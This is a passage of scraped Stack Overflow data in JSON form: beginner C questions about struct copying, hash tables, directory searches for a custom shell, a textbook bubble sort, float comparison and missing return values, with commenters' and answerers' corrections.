"https://stackoverflow.com/questions/53935458/initialising-structs-via-function-with-strcpy-in-c", "closed_reason": "Duplicate", "title": "initialising structs via function with strcpy in c", "body": "<p>I am a beginner in c and am wondering why my function feed_struct doesn't copies the strings I handle to it. This funcion ( feed_struct) should take input data and put it in a struct, which I defined globally. Does anyone know why there happens nothing with the struct?\nThanks for your help in advance!</p>\n\n<pre><code>void feed_struct(struct student x, char name [20], char lname [20], double a, char adres [50], int b)\n{\n    strcpy(x.name, name);\n    strcpy(x.lastname, lname);\n    x.number = a;\n    strcpy(x.adres, adres);\n    x.course = b;\n\n\n}\n\nint main (void)\n{\n    struct student new_student;\n    feed_struct(new_student, \"Peter\", \"Panther\", 1230, \"El-Lobo-Street 32\", 72);\n    struct_print(new_student);\n    return 0;\n\n}  \n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "edited": false, "score": 0, "creation_date": 1545845703, "post_id": 53935208, "comment_id": 94710567, "body": "Isn&#39;t this <code>fscanf (fp,&quot;%s&quot;,&amp;data)</code> should be <code>fscanf (fp,&quot;%s&quot;,&amp;data[i])</code> as <code>data</code> is 2D array."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 1, "creation_date": 1545846355, "post_id": 53935208, "comment_id": 94710770, "body": "There are so many errors in that code, please compile asking for all the warnings and look at the errors and warning produced by your compiler to fix them"}], "answers": [{"tags": [], "owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "is_accepted": false, "score": 0, "last_activity_date": 1545846337, "creation_date": 1545846337, "answer_id": 53935319, "question_id": 53935208, "link": "https://stackoverflow.com/questions/53935208/array-of-linked-list-for-hash-table/53935319#53935319", "title": "array of linked list for hash table", "body": "<p>There are lot of bugs in the code, I'm just putting my possible observation. Firstly this</p>\n\n<pre><code>fscanf (fp,\"%s\",&amp;data);\n</code></pre>\n\n<p>should be</p>\n\n<pre><code>fscanf (fp,\"%s\",&amp;data[i]);\n</code></pre>\n\n<p>Secondly, here in <code>descend()</code> function inner loop condition part you are using <code>j=20</code> which loops to run infinitely. This is where MACRO comes handy as this <code>j=20</code> simply runs i.e if it could have <code>ROW=j</code> where <code>ROW</code> is <code>20</code> compiler produces meaningful  error. This</p>\n\n<pre><code>void descend (data) { /* what is the tyep of data ?  you should mention the data type */ \n    int temp;\n    for(i=0;i&lt;100;i++) { /* there are only 20 lines not 100 i.e it should be i&lt;20 */\n       for(j=0;j=20;j++) { /* condition is wrong, you indented for j&lt;20 but that too\n                             wrong as there are supposed to be max 100 char in line \n                             it should be j&lt;100 */\n         if (data[i][j+1]&gt;data[i][j]) /* condition is not correct */\n            temp=data[i][j];\n            data[i][j]=data[i][j+1];\n            data[i][j+1]=temp;\n         }\n    }   \n}\n</code></pre>\n\n<p>Correct version <code>descend</code> function can be</p>\n\n<pre><code>void descend (char (*data)[ROW], int col) {  /* define ROW as macro with value 20 and pass the col i.e 100 */\n\n    int temp;\n    for(i=0;i &lt; ROW; i++) {\n       for(j=0;j &lt; col; j++) {\n         if (data[i][j] &gt; data[i][j+1])\n            temp = data[i][j];\n            data[i][j] = data[i][j+1];\n            data[i][j+1] = temp;\n         }\n    }   \n}\n</code></pre>\n\n<p>Also check the return value of <code>fopen()</code> to check whether it was success r failed and do proper validation. For e.g</p>\n\n<pre><code>fp = fopen(\"data.txt\",\"r\");\nif(fp == NULL) {\n   /* @TODO error handling */\n   fprintf(stderr,\"file doesn't exist\");\n   return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5234, "user_id": 7400903, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/66a5c6bdca5a30cc6fdacd92fc5745a2?s=128&d=identicon&r=PG&f=1", "display_name": "goodvibration", "link": "https://stackoverflow.com/users/7400903/goodvibration"}, "is_accepted": false, "score": 0, "last_activity_date": 1545846493, "creation_date": 1545846493, "answer_id": 53935337, "question_id": 53935208, "link": "https://stackoverflow.com/questions/53935208/array-of-linked-list-for-hash-table/53935337#53935337", "title": "array of linked list for hash table", "body": "<p>To begin with, it looks like you should declare <code>char data[20][100]</code> instead of <code>char data[100][20]</code>.</p>\n\n<p>Then, inside the loop of 20 iterations, you should refer to <code>data[i]</code> instead of <code>data</code>:</p>\n\n<pre><code>for (int i=0; i&lt;20; i++)\n    fscanf(fp,\"%s\",data[i]);\n    printf(\"%s\\n\",data[i]);\n}\n</code></pre>\n\n<p>Keep in mind you're assuming that each line in your input file is at most 99-character long.</p>\n\n<p>This doesn't answer the actual question I suppose, but you should by the least get all the above fixed.</p>\n"}], "owner": {"reputation": 11, "user_id": 10836022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/42ff427870c29bc5a162092c033f69fe?s=128&d=identicon&r=PG&f=1", "display_name": "JasonM76", "link": "https://stackoverflow.com/users/10836022/jasonm76"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 148, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1545846493, "creation_date": 1545845587, "last_edit_date": 1545845751, "question_id": 53935208, "link": "https://stackoverflow.com/questions/53935208/array-of-linked-list-for-hash-table", "title": "array of linked list for hash table", "body": "<p>I want to know about bring the text file with 10 names and read it. 10 names are sorting by descending and forming a hash table with division method. I need to construct linked list of them. The hash table's index is number of 7.</p>\n\n<p>I've tried on match pointer variable and made a hash table, but I can't do that. I'm in trouble with making hash table, inserting data, printing hash table and searching data(A function to find when I type a name.). I need to add more function..how do i made it?</p>\n\n<pre><code>#define SIZE 7\n\n\nstruct node {\n   char data[100][20];\n   struct node* next; \n}; \n\nstruct index {\n   struct node* head; \n   int count; \n};\n\n\n\nstruct sum (data){ \n   struct node* ptr;\n\n   int sum,i;\n   for (i=0; i&lt;20; i++) {\n    ptr -&gt; data[i] = ptr;\n    strcpy(sum,ptr);\n   }\n\n  return sum;   \n};\n\n\nint hashFunction (int sum) { \n\n    return sum%SIZE; \n}\n\n\n\nvoid descend (data) { \n\n    int temp;\n    for(i=0;i&lt;100;i++) {\n       for(j=0;j=20;j++) {\n         if (data[i][j+1]&gt;data[i][j])\n            temp=data[i][j];\n            data[i][j]=data[i][j+1];\n            data[i][j+1]=temp;\n         }\n    }   \n}\n\n\n\nint main (void) {\n\n    char data[100][20];\n    FILE *fp;\n    fp = fopen(\"data.txt\",\"r\");\n    for (int i=0; i&lt;20; i++)\n        fscanf (fp,\"%s\",&amp;data);\n        printf(\"%s\\n\",data);\n    }\n    fclose(fp);\n    hashTable = (struct index*)malloc(SIZE*sizeof(struct index));\n    descend(data);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "subdirectory"], "comments": [{"owner": {"reputation": 4095, "user_id": 3957200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/25mzd.jpg?s=128&g=1", "display_name": "Cinder Biscuits", "link": "https://stackoverflow.com/users/3957200/cinder-biscuits"}, "edited": false, "score": 0, "creation_date": 1545847037, "post_id": 53935170, "comment_id": 94710939, "body": "Are you trying to reinvent <code>which(1)</code>? <a href=\"https://linux.die.net/man/1/which\" rel=\"nofollow noreferrer\">linux.die.net/man/1/which</a>"}], "answers": [{"tags": [], "owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "is_accepted": false, "score": 0, "last_activity_date": 1545847684, "last_edit_date": 1545847684, "creation_date": 1545845509, "answer_id": 53935200, "question_id": 53935170, "link": "https://stackoverflow.com/questions/53935170/how-to-check-if-a-file-is-in-a-specific-directory-or-its-subdirectories-in-c/53935200#53935200", "title": "How to check if a file is in a specific directory or its subdirectories in C", "body": "<p>you need to look at the directory content, look at the functions <em>opendir</em> / <em>readdir</em> / <em>closedir</em> (<code>#include &lt;dirent.h&gt;</code>)</p>\n\n<p>{edit add}</p>\n\n<p>Take care, when you scan the content of a directory you will reach the directories \".\" and \"..\", do not go recursively into them because \".\" is the current directory and \"..\" the upper directory (except for \"/\" where \"..\" is also \"/\")</p>\n"}, {"tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": false, "score": 0, "last_activity_date": 1545847161, "creation_date": 1545847161, "answer_id": 53935436, "question_id": 53935170, "link": "https://stackoverflow.com/questions/53935170/how-to-check-if-a-file-is-in-a-specific-directory-or-its-subdirectories-in-c/53935436#53935436", "title": "How to check if a file is in a specific directory or its subdirectories in C", "body": "<p>You could not only use <a href=\"http://man7.org/linux/man-pages/man3/opendir.3.html\" rel=\"nofollow noreferrer\">opendir(3)</a> &amp; <a href=\"http://man7.org/linux/man-pages/man3/readdir.3.html\" rel=\"nofollow noreferrer\">readdir(3)</a> &amp; <code>closedir</code> but you probably want to <em>construct</em> some file path in a string (using string routines like <code>snprintf</code> or <a href=\"http://man7.org/linux/man-pages/man3/asprintf.3.html\" rel=\"nofollow noreferrer\">asprintf</a>) and use <a href=\"http://man7.org/linux/man-pages/man2/stat.2.html\" rel=\"nofollow noreferrer\">stat(2)</a> or <a href=\"http://man7.org/linux/man-pages/man2/access.2.html\" rel=\"nofollow noreferrer\">access(2)</a> on it (since <code>readdir</code> returns a directory entry, whose <code>d_name</code> you would combine with the path of the containing directory).</p>\n\n<p>You could also use <a href=\"http://man7.org/linux/man-pages/man3/nftw.3.html\" rel=\"nofollow noreferrer\">nftw(3)</a>.</p>\n\n<p>However, inside a shell, you just want to iterate on the components of the <a href=\"https://en.wikipedia.org/wiki/PATH_(variable)\" rel=\"nofollow noreferrer\"><code>PATH</code> variable</a>, and append the program name to each of them. For that point a recursive descent is not needed. And there is also <a href=\"http://man7.org/linux/man-pages/man3/execvp.3.html\" rel=\"nofollow noreferrer\">execvp(3)</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 91, "user_id": 10836046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8697be77607f34a8134fcd574b5da31c?s=128&d=identicon&r=PG&f=1", "display_name": "Julien", "link": "https://stackoverflow.com/users/10836046/julien"}, "edited": false, "score": 0, "creation_date": 1545848878, "post_id": 53935444, "comment_id": 94711535, "body": "Thank you a lot ! That was exactly what I was looking for. Merci beaucoup !"}], "tags": [], "owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "is_accepted": true, "score": 3, "last_activity_date": 1545847203, "creation_date": 1545847203, "answer_id": 53935444, "question_id": 53935170, "link": "https://stackoverflow.com/questions/53935170/how-to-check-if-a-file-is-in-a-specific-directory-or-its-subdirectories-in-c/53935444#53935444", "title": "How to check if a file is in a specific directory or its subdirectories in C", "body": "<p>Don't write the recursive function by yourself, prefer use of the standard <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799//functions/nftw.html\" rel=\"nofollow noreferrer\">nftw</a>:</p>\n\n<blockquote>\n  <p><strong>NAME</strong></p>\n  \n  <p>nftw - walk a file tree</p>\n  \n  <p><strong>SYNOPSIS</strong></p>\n\n<pre><code>#include &lt;ftw.h&gt;\n\nint nftw(const char *path, int (*fn)(const char *,\n         const struct stat *, int, struct FTW *), int fd_limit, int flags);\n</code></pre>\n  \n  <p><strong>DESCRIPTION</strong></p>\n  \n  <p>The nftw() function shall recursively descend the directory hierarchy\n  rooted in path.</p>\n</blockquote>\n\n<p>But, for a standard shell there is no need to search recursively (worst, that would be very weird for any user), you just need to search in directories mentioned in <code>PATH</code> environment variable.</p>\n"}], "owner": {"reputation": 91, "user_id": 10836046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8697be77607f34a8134fcd574b5da31c?s=128&d=identicon&r=PG&f=1", "display_name": "Julien", "link": "https://stackoverflow.com/users/10836046/julien"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "accepted_answer_id": 53935444, "answer_count": 3, "score": 0, "last_activity_date": 1545847684, "creation_date": 1545845315, "last_edit_date": 1545846675, "question_id": 53935170, "link": "https://stackoverflow.com/questions/53935170/how-to-check-if-a-file-is-in-a-specific-directory-or-its-subdirectories-in-c", "title": "How to check if a file is in a specific directory or its subdirectories in C", "body": "<p>I am building my own shell and I was wondering: how can I know if a commande  is on the directory \"/bin\" and its subdirectories.\nI would like to implement a function char* path_to_command(char* commandname) which return the path of a command given in parameters.</p>\n\n<p>I've been looking for functions which determine if a specific file is in a directory (like fopen, or access). But those functions just tell us if the file is in the directory only. \nI was thinking about a recursive function with fopen, where I would have to use strcat a lots of time.\nI believe that there is a better solution.</p>\n\n<p>English is not my native language, I'm very sorry if there are mistakes.\nThank you. </p>\n"}, {"tags": ["c", "indexing", "indexoutofboundsexception", "bubble-sort"], "comments": [{"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "edited": false, "score": 4, "creation_date": 1545844430, "post_id": 53934924, "comment_id": 94710144, "body": "<code>j+=1</code> --&gt; <code>j-=1</code>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1545844610, "post_id": 53934924, "comment_id": 94710192, "body": "Welcome to Stack Overflow.  You&#39;ve taken on board most of the ideas behind creating an MCVE (<a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>), but it&#39;s possible to argue you&#39;ve missed on the completeness.  You could improve the question by showing a simple example of how you printed the indices, maybe with a short array (perhaps 5 elements; 3 would suffice) and the output to demonstrate your concern."}, {"owner": {"reputation": 25, "user_id": 7952998, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efffb28175ae47301cf88b132cb782a1?s=128&d=identicon&r=PG&f=1", "display_name": "MDescamps", "link": "https://stackoverflow.com/users/7952998/mdescamps"}, "reply_to_user": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "edited": false, "score": 0, "creation_date": 1545844739, "post_id": 53934924, "comment_id": 94710240, "body": "@Achal Thank you! That makes more sense. It was probably what the authors had intended."}], "answers": [{"tags": [], "owner": {"reputation": 16, "user_id": 10836116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0495570e750962f07063fa5f88b43148?s=128&d=identicon&r=PG&f=1", "display_name": "crystal", "link": "https://stackoverflow.com/users/10836116/crystal"}, "is_accepted": true, "score": 0, "last_activity_date": 1545846665, "creation_date": 1545846665, "answer_id": 53935361, "question_id": 53934924, "link": "https://stackoverflow.com/questions/53934924/possible-mistake-in-bubble-sort-c-program/53935361#53935361", "title": "Possible mistake in bubble sort c program", "body": "<p>I've tried this code, too. I have compiled it with GCC and somehow it worked for me (the exit status of the program was 0 and the array was sorted correctly). But I also think that their is a problem with the second loop. I would change the j+= 1 instruction into j-=1. Otherwise the second loop could end in an infinite loop. Additionally I would change the i=0 instruction in the first loop into a i=1 instruction, because it would end in an unnecessary iteration.</p>\n"}], "owner": {"reputation": 25, "user_id": 7952998, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efffb28175ae47301cf88b132cb782a1?s=128&d=identicon&r=PG&f=1", "display_name": "MDescamps", "link": "https://stackoverflow.com/users/7952998/mdescamps"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 94, "favorite_count": 0, "accepted_answer_id": 53935361, "answer_count": 1, "score": 1, "last_activity_date": 1545846665, "creation_date": 1545843881, "last_edit_date": 1545845175, "question_id": 53934924, "link": "https://stackoverflow.com/questions/53934924/possible-mistake-in-bubble-sort-c-program", "title": "Possible mistake in bubble sort c program", "body": "<p>I was reading the book \"Computer Organization and Design\" by Patterson and Hennesy (5th Edition) and found this bubble sort code:</p>\n\n<pre><code>void sort (int v[], int n)\n{\n    int i,j;\n    for (i=0; i&lt;n; i+=1) {\n        for (j = i-1; j&gt;=0 &amp;&amp; v[j] &gt; v[j+1]; j+=1) {\n            swap(v,j);\n        }\n    }\n}\n\nvoid swap (int v[], int k) {\n    int temp;\n    temp = v[k];\n    v[k] = v[k+1];\n    v[k+1] = temp;\n}\n</code></pre>\n\n<p>I don't understand how this function would sort an array. Especially if the first element of the array is also the largest, it seems to me that the index <code>j</code> would go out of bounds. Running the code and printing the indices confirmed this.</p>\n\n<p>This is the code I used:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid swap (int v[], int k) {\n    int temp;\n    temp = v[k];\n    v[k] = v[k+1];\n    v[k+1] = temp;\n}\n\nvoid sort (int v[], int n)\n{\n    int i,j;\n    for (i=0; i&lt;n; i+=1) {\n        printf(\"%d \\n\", i);\n        for (j = i-1; j&gt;=0 &amp;&amp; v[j] &gt; v[j+1]; j+=1) {\n            printf(\"%d, %d \\n\", i, j);\n            swap(v,j);\n        }\n    }\n}\n\nint main() {\n    int x[3] = {5,1,2};\n    int N = 3;\n\n    sort(x, N);\n    for(int i = 0; i &lt; 3; i++) {\n        printf(\"%d \", x[i]);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>This was the result:</p>\n\n<pre><code>/Users/mauritsdescamps/Desktop/test/cmake-build-debug/test\n0 \n1 \n1, 0 \n1, 1 \n1, 2 \n1, 3 \n1, 4 \n2 \n2, 1 \n2, 2 \n2, 3 \n\nProcess finished with exit code 6\n</code></pre>\n\n<p>Is there something I am forgetting? If not, I think there must be a mistake in the second loop condition. I have seen other implementations of the algorithm but I want to know how to get this approach to work.</p>\n"}, {"tags": ["c", "while-loop"], "comments": [{"owner": {"reputation": 5386, "user_id": 121035, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fd9eafda960d5054d63ad2c2cf9ecf9?s=128&d=identicon&r=PG", "display_name": "steve", "link": "https://stackoverflow.com/users/121035/steve"}, "edited": false, "score": 0, "creation_date": 1545842960, "post_id": 53934697, "comment_id": 94709682, "body": "You can compare floats like this. Have a look at the epsilon function."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1545842962, "post_id": 53934697, "comment_id": 94709683, "body": "In particular, <code>1.1</code> is of type double which is inexact anyway but is then converted to <code>float</code> so is even less exact. The <code>float</code> is then compared with a <code>double</code> value."}, {"owner": {"reputation": 9, "user_id": 10835916, "user_type": "registered", "profile_image": "https://graph.facebook.com/2244674039191413/picture?type=large", "display_name": "Mustafa HK", "link": "https://stackoverflow.com/users/10835916/mustafa-hk"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545843449, "post_id": 53934697, "comment_id": 94709825, "body": "@WeatherVane how 1.1 is double not float?"}, {"owner": {"reputation": 5576, "user_id": 767632, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/75a05c23a398c887e8f085b9c870586c?s=128&d=identicon&r=PG", "display_name": "yeputons", "link": "https://stackoverflow.com/users/767632/yeputons"}, "edited": false, "score": 1, "creation_date": 1545843889, "post_id": 53934697, "comment_id": 94709957, "body": "@MustafaHK It&#39;s in C++ standard, floating point literals are <code>double</code> by default. If you write <code>1.1f</code>, then it will be <code>float</code>. Do not expect that to fix the problem permanently, though."}, {"owner": {"reputation": 2055, "user_id": 6564148, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/u3HL5.png?s=128&g=1", "display_name": "George", "link": "https://stackoverflow.com/users/6564148/george"}, "reply_to_user": {"reputation": 5576, "user_id": 767632, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/75a05c23a398c887e8f085b9c870586c?s=128&d=identicon&r=PG", "display_name": "yeputons", "link": "https://stackoverflow.com/users/767632/yeputons"}, "edited": false, "score": 0, "creation_date": 1545844110, "post_id": 53934697, "comment_id": 94710031, "body": "@yeputons I&#39;d be surprised if it didn&#39;t fix the problem. It&#39;s after arithmetic and conversions where direct float comparisons break down."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545844254, "post_id": 53934697, "comment_id": 94710075, "body": "@MustafaHK by definition, similarly <code>&#39;a&#39;</code> is type <code>int</code> and not type <code>char</code>."}, {"owner": {"reputation": 25937, "user_id": 338904, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/dea29233fa03ea84f8a853102deb0344?s=128&d=identicon&r=PG", "display_name": "e2-e4", "link": "https://stackoverflow.com/users/338904/e2-e4"}, "edited": false, "score": 0, "creation_date": 1545846120, "post_id": 53934697, "comment_id": 94710693, "body": "Try to sum negative powers of 2 to reach 0.1 to get an idea of the problem. <a href=\"https://www.exploringbinary.com/why-0-point-1-does-not-exist-in-floating-point/\" rel=\"nofollow noreferrer\">exploringbinary.com/&hellip;</a>"}, {"owner": {"reputation": 9, "user_id": 10835916, "user_type": "registered", "profile_image": "https://graph.facebook.com/2244674039191413/picture?type=large", "display_name": "Mustafa HK", "link": "https://stackoverflow.com/users/10835916/mustafa-hk"}, "reply_to_user": {"reputation": 25937, "user_id": 338904, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/dea29233fa03ea84f8a853102deb0344?s=128&d=identicon&r=PG", "display_name": "e2-e4", "link": "https://stackoverflow.com/users/338904/e2-e4"}, "edited": false, "score": 0, "creation_date": 1545846464, "post_id": 53934697, "comment_id": 94710796, "body": "@Ring&#216; that makes sense thank you."}], "owner": {"reputation": 9, "user_id": 10835916, "user_type": "registered", "profile_image": "https://graph.facebook.com/2244674039191413/picture?type=large", "display_name": "Mustafa HK", "link": "https://stackoverflow.com/users/10835916/mustafa-hk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "closed_date": 1545842578, "answer_count": 0, "score": 0, "last_activity_date": 1545845429, "creation_date": 1545842509, "last_edit_date": 1545845429, "question_id": 53934697, "link": "https://stackoverflow.com/questions/53934697/equality-operator-in-while-loop-is-not-working-as-expected", "closed_reason": "Duplicate", "title": "Equality operator &quot;==&quot; in while loop is not working as expected?", "body": "<p>Nothing is printing why? It should print at least for one time, shouldn't it?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    float x = 1.1;\n    while (x == 1.1)\n    {\n        printf(\"\\n%f\", x);\n        x = x \u2013 0.1;\n    }\n}\n</code></pre>\n\n<p>The program is running if I change \"==\" to \">=\"; how is <code>x&gt;=1.1</code> true when x is equal to 1.1 by definition. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    float x = 1.1;\n\n    while (x &gt;= 1.1)\n    {\n        printf(\"\\n%f\", x);\n        x = x - 0.1;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "matrix", "return"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545841999, "post_id": 53934585, "comment_id": 94709337, "body": "You are not collecting or using any return value anyway, but the compiler should be warning you."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1545842022, "post_id": 53934585, "comment_id": 94709345, "body": "Well, you don&#39;t store the return value anywhere so how can you say it works?"}, {"owner": {"reputation": 25637, "user_id": 6243352, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/715f60f9edc65642a6805752cfeebb27?s=128&d=identicon&r=PG&f=1", "display_name": "ggorlen", "link": "https://stackoverflow.com/users/6243352/ggorlen"}, "edited": false, "score": 0, "creation_date": 1545842055, "post_id": 53934585, "comment_id": 94709360, "body": "<code>gcc -Wall yourprog.c</code> says <code>warning: control reaches end of non-void function [-Wreturn-type]</code>. C permits you to do this, but the behavior is undefined, so anything <i>could</i> happen, including the appearance of &quot;working&quot;."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1545842112, "post_id": 53934585, "comment_id": 94709379, "body": "&quot;How do I write the print_random_matrix function with a return statement?&quot; What do you want it to return?"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1545842194, "post_id": 53934585, "comment_id": 94709418, "body": "I guess that you want: <code>int print_random_matrix (int m, int n)</code> ==&gt; <code>void print_random_matrix (int m, int n)</code>"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1545843941, "post_id": 53934585, "comment_id": 94709974, "body": "I&#39;m tempted to reopen, since the examples and their behavior are substantially different according to the C standard."}], "answers": [{"comments": [{"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 1, "creation_date": 1545842341, "post_id": 53934630, "comment_id": 94709475, "body": "Technically I think failing to return a value is not undefined behaviour unless the caller accesses the return value, which is not the case here."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545842618, "post_id": 53934630, "comment_id": 94709573, "body": "@Arkku <i>failing to return a value is not undefined behaviour unless the caller accesses the return value</i> I seem to remember something similar.  I can&#39;t seem to find a cite in the C standard, however."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 1, "creation_date": 1545842808, "post_id": 53934630, "comment_id": 94709639, "body": "@Arkku - You are indeed correct. It&#39;s <a href=\"https://port70.net/~nsz/c/c11/n1570.html#6.9.1p12\" rel=\"nofollow noreferrer\">6.9.1p12</a>."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": 